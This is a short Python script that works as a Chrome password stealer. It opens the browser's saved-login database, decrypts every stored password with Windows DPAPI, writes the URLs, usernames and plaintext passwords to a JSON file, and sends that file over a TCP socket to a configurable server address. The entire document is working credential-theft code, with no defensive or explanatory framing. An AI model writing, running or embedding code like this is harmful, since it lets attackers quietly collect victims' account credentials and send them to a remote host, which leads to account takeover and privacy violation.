# Python version 3.6.6 64-bit
from datetime import datetime
import os
import sqlite3
import win32crypt
import json
import socket
host = '192.168.1.10' #Change IP for Servername
port = 12345 #Change desired Port
addr = (host,port)

info_list = []
currentdate = datetime.now()
filename = 'passwords'+currentdate.strftime('%Y%m%d%H%M%S')

path = os.getenv('localappdata') + \
		'\\Google\\Chrome\\User Data\\Default\\'
connection = sqlite3.connect(path + "Login Data")

with connection:
        cursor = connection.cursor()
        v = cursor.execute(
                'SELECT action_url, username_value, password_value FROM logins')
        value = v.fetchall()
	
for information in value:
        password = win32crypt.CryptUnprotectData(
                information[2], None, None, None, 0)[1]
        if information[2]:
                    info_list.append({
                        'origin_url': information[0],
                        'username_value': information[1],
                        'password_value': str(password)
                    })

with open(filename, 'w') as json_file:
        json.dump({'passwords':info_list},json_file)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(addr)

with open(filename,'rb') as f:
    data = f.read()
    s.sendall(data)
    s.close()